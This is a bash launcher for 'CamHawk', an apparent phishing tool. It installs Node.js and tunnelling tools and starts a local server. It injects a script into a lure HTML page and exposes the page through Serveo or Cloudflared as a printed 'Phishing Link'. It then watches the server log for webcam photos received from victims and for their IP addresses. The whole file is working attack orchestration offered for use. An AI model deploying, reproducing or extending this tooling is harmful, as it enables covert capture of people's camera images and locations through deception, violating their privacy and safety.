#!/usr/bin/env bash

# Colors
GREEN="\e[1;32m"
RED="\e[1;31m"
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
CYAN="\e[1;36m"
RESET="\e[0m"

# Variables
SERVER_PORT=3000
SERVER_PID=""
TUNNEL_PID=""
PHISHING_URL=""
TUNNEL_CHOICE=""

# Banner
banner() {
 clear
 echo -e "${YELLOW}"
 cat << "EOF" 

   _____                _    _                _    
  / ____|              | |  | |              | |   
 | |     __ _ _ __ ___ | |__| | __ ___      _| | __
 | |    / _` | '_ ` _ \|  __  |/ _` \ \ /\ / / |/ /
 | |___| (_| | | | | | | |  | | (_| |\ V  V /|   < 
  \_____\__,_|_| |_| |_|_|  |_|\__,_| \_/\_/ |_|\_\
                                                   
                                                             
                                Developer : Sreeraj

EOF
 echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
}

# Install Dependencies
install_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${RESET}"

    # Detect package manager
    if command -v apt-get &>/dev/null; then
        PKG_INSTALL="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
    elif command -v yum &>/dev/null; then
        PKG_INSTALL="sudo yum install -y"
        UPDATE_CMD="sudo yum update -y"
    elif command -v dnf &>/dev/null; then
        PKG_INSTALL="sudo dnf install -y"
        UPDATE_CMD="sudo dnf update -y"
    elif command -v pacman &>/dev/null; then
        PKG_INSTALL="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Syu"
    else
        echo -e "${RED}[-] No supported package manager found! Please install dependencies manually.${RESET}"
        return 1
    fi

    $UPDATE_CMD

    if ! command -v node &>/dev/null; then
        echo -e "${RED}[-] Node.js is not installed! Installing...${RESET}"
        $PKG_INSTALL nodejs
    fi

    if ! command -v npm &>/dev/null; then
        echo -e "${RED}[-] npm is not installed! Installing...${RESET}"
        $PKG_INSTALL npm
    fi

    if ! command -v lsof &>/dev/null; then
        echo -e "${RED} [-] lsof is not installed! Installing...${RESET}"
        $PKG_INSTALL lsof
    fi

    if ! command -v ssh &>/dev/null; then
        echo -e "${RED}[-] OpenSSH client is not installed! Installing...${RESET}"
        $PKG_INSTALL openssh-client || $PKG_INSTALL openssh
    fi

    npm list express 2>/dev/null | grep -q "express@" || { 
        echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"; 
        npm install express; 
    }

    if ! command -v cloudflared &>/dev/null; then
        echo -e "${RED}[-] Cloudflared is not installed! Installing...${RESET}"
        sudo wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
        sudo chmod +x /usr/local/bin/cloudflared
    fi

    echo -e "${GREEN}[+] All dependencies are installed!${RESET}"
}

create_needed_files() {
      touch server.log 2>/dev/null
      touch cloudflared.txt 2>/dev/null
      touch serveo.txt 2>/dev/null
}

# Kill Any Existing Server on Port 3000
kill_old_server() {
    OLD_PID=$(lsof -ti :$SERVER_PORT)
    if [[ ! -z "$OLD_PID" ]]; then
        echo -e "${YELLOW}[+] Killing old server running on port $SERVER_PORT...${RESET}"
        kill -9 $OLD_PID
        echo -e "${GREEN}[+] Old server stopped!${RESET}"
    fi
}

select_html_file() {
    echo -ne "${CYAN}[+] Enter the path to the custom HTML file (or press Enter to use the default): ${RESET}"
    read HTML_PATH

    if [[ -n "$HTML_PATH" && -f "$HTML_PATH" ]]; then
        cp "$HTML_PATH" templates1/index.html
        sed -i '/<\/body>/i <script src="script.js"></script>' templates1/index.html
        USE_CUSTOM_HTML=true
    else
        echo -e "${YELLOW}[+] Using default HTML page.${RESET}"
        USE_CUSTOM_HTML=false
    fi
}

set_permissions() {
    # Get absolute path of the script
    SCRIPT_PATH="$(readlink -f "$0")"

    # Go one level up from script directory to get the main CamHawk directory
    SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
    MAIN_DIR="$(dirname "$SCRIPT_DIR")"

    # Get current user, directory owner and group
    CURRENT_USER="$(whoami)"
    DIR_OWNER="$(stat -c '%U' "$MAIN_DIR")"
    DIR_GROUP="$(stat -c '%G' "$MAIN_DIR")"

    # Fix access if user is not owner and not in group OR cannot write
    if [[ ! -w "$MAIN_DIR" ]] || ([[ "$CURRENT_USER" != "$DIR_OWNER" ]] && ! id -nG "$CURRENT_USER" | grep -qw "$DIR_GROUP"); then

        if [[ "$EUID" -eq 0 ]]; then
            # Running as root -> restore ownership to the original user
            TARGET_USER="${SUDO_USER:-$(logname 2>/dev/null || echo root)}"
            chown -R "$TARGET_USER":"$TARGET_USER" "$MAIN_DIR" 2>/dev/null
            chmod -R u+rwx "$MAIN_DIR" 2>/dev/null
        else
            # Running as normal user -> grant safe access
            chmod -R u+rwX "$MAIN_DIR" 2>/dev/null
        fi

        # Final fallback if still not writable
        [[ -w "$MAIN_DIR" ]] || chmod -R 777 "$MAIN_DIR" 2>/dev/null
    fi
}

# Start the Node.js Server
start_server() {
    echo -e "${YELLOW}[+] Starting CamHawk Server...${RESET}"
    if [ "$USE_CUSTOM_HTML" = true ]; then
        node server1.js > server.log 2>&1 &
    else
        node server.js > server.log 2>&1 &
    fi
    SERVER_PID=$!
    sleep 2

    if ps -p $SERVER_PID > /dev/null; then
        echo -e "${GREEN}[+] Server started successfully!${RESET}"
    else
        echo -e "${RED}[-] Server failed to start!${RESET}"
        exit 1
    fi
}


# Tunnel Selection Menu
select_tunnel() {
    echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost${RESET}"

    echo -ne "${GREEN}[+] Enter choice (1,2,3):${RESET} "
    read choice

    case $choice in
        1) TUNNEL_CHOICE="serveo" ;;
        2) TUNNEL_CHOICE="cloudflared" ;;
        3) TUNNEL_CHOICE="localhost" ;;
        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"
           TUNNEL_CHOICE="serveo"
        ;;
    esac
}

# Start Serveo.net Tunneling
start_serveo() {
    echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
    ssh -R 80:localhost:$SERVER_PORT serveo.net > serveo.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    if grep -q "Forwarding HTTP traffic" serveo.txt; then
        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveousercontent.com" serveo.txt)
        echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
    else
        echo -e "${RED}[-] Serveo failed!${RESET}"
        stop_server
        exit 1
    fi
}

# Start Cloudflared Tunneling 
start_cloudflared() {
    echo -e "${YELLOW}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel --url "http://localhost:$SERVER_PORT" > cloudflared.txt 2>&1 &
    TUNNEL_PID=$!
    sleep 5

    # Wait for Cloudflared to generate the link properly
    for i in {1..10}; do
        PHISHING_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com" cloudflared.txt)
        if [[ ! -z "$PHISHING_URL" ]]; then
            echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
            return
        fi
        sleep 1
    done

    echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
    stop_server
    exit 1
}

start_localhost() {

    PHISHING_URL="http://localhost:$SERVER_PORT"

    echo -e "${GREEN}[+] Localhost server started!${RESET}"
    echo -e "${CYAN}[+] Server Port : ${SERVER_PORT}${RESET}"
    echo -e "${GREEN}[+] Local Testing URL:${RESET}"
    echo -e "${CYAN}${PHISHING_URL}${RESET}"

    echo
    echo -e "${YELLOW}[+] If you are using a VPS or external tunnel, forward this port:${RESET}"
    echo -e "${CYAN}localhost:${SERVER_PORT}${RESET}"
}

# Monitor for Received Photos
monitor_photos() {
    echo -e "${YELLOW}[+] Waiting for photos...${RESET}"
    tail -f server.log | while read line; do
        if echo "$line" | grep -q "Photo received"; then
            IP=$(echo "$line" | grep -oE "IP: ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[a-fA-F0-9:]+)" | cut -d ' ' -f2)
            echo -e "${GREEN}[+] Photo Received! User IP: ${IP}${RESET}"
        fi
    done
}

# Stop the Server
stop_server() {
    rm -f templates1/index.html
    echo -e "${YELLOW}[+] Stopping CamHawk server...${RESET}"
    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
    exit 0
}

# Trap Ctrl+C to stop the server
trap stop_server SIGINT

# Run the script
banner
install_dependencies
create_needed_files
banner
kill_old_server
select_html_file
set_permissions
start_server
select_tunnel

if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
    start_serveo
elif [[ "$TUNNEL_CHOICE" == "cloudflared" ]]; then
    start_cloudflared
else
    start_localhost
fi

monitor_photos
